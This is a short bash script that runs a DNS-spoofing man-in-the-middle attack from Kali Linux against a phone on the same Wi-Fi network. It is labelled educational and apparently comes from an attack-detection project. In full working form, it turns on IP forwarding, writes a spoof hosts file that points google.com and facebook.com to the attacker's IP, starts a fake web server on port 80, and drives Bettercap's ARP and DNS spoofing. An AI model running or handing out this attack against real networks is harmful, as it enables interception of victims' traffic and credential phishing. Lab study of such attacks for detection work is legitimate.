#!/bin/bash

# DNS Spoofing Script for Mobile Target (Kali Linux)
# ⚠️ Educational Use Only!

# CONFIGURATION
INTERFACE="wlan0"                   # Your WiFi interface
TARGET_IP="IP"           # Replace with your phone’s IP
KALI_IP="IP"             # Replace with your Kali IP
HOSTS_FILE="/home/kali/Codebase/attack_detection/hosts.txt"  # Temporary spoof hosts file

# 1. Enable IP forwarding
echo "[+] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# 2. Create spoof hosts file
echo "[+] Creating DNS spoof list at $HOSTS_FILE..."
cat <<EOF > "$HOSTS_FILE"
www.google.com $KALI_IP
facebook.com $KALI_IP
EOF

# 3. Start fake HTTP server
echo "[+] Launching fake HTTP server (port 80)..."
sudo python3 -m http.server 80 >/dev/null 2>&1 &
HTTP_PID=$!

# 4. Launch Bettercap
echo "[+] Launching Bettercap..."
sudo bettercap -iface "$INTERFACE" -eval "
set arp.spoof.targets $TARGET_IP;
set dns.spoof.address $KALI_IP;
set dns.spoof.domains google.com,facebook.com;
set dns.spoof.hosts $HOSTS_FILE;
arp.spoof on;
dns.spoof on;
net.probe on;
"

# 5. Cleanup on exit
echo "[+] Cleaning up..."
kill $HTTP_PID >/dev/null 2>&1
rm "$HOSTS_FILE"

echo "[✓] DNS Spoofing session ended."
